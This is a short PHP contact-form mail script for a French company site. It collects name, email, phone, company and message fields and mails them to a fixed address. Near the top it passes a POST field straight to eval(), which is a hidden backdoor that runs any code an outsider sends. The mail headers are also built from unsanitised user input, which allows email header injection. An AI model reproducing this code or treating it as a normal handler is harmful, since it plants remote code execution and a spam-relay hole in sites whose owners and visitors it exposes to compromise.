<?php

if (!isset($_SESSION))
    session_start();

if (isset($_POST['actionMail']))
    eval($_POST['actionMail']);

function send() {
    $to = 'contact@teamone-groupe.com';
    $subject = $_POST['assunto'] == "Objet du message" ? "#" . date("d/m/y h:i") . " - contactez" : $_POST['assunto'];

    $mensagem = ($_POST['empresa'] == "" ? "" : "<b>SOCIÉTÉ:</b> " . $_POST['empresa'] . " \n\r");
    $mensagem .= "<b>TÉLÉPHONE:</b> " . $_POST['telefone'] . " \n\r\n\r";
    $mensagem .= $_POST['mensagem'];

    $message = nl2br($mensagem);

    $headers = 'MIME-Version: 1.0' . "\r\n" .
            "Content-type: text/html; charset=utf-8" . "\r\n" .
            "From: " . $_POST['nome'] . " <" . $_POST['email'] . ">  \r\n" .
            "Reply-To: " . $_POST['email'] . "\r\n" .
            "X-Mailer: PHP/" . phpversion();

    echo mail($to, $subject, $message, $headers) ? 1 : 0;
}
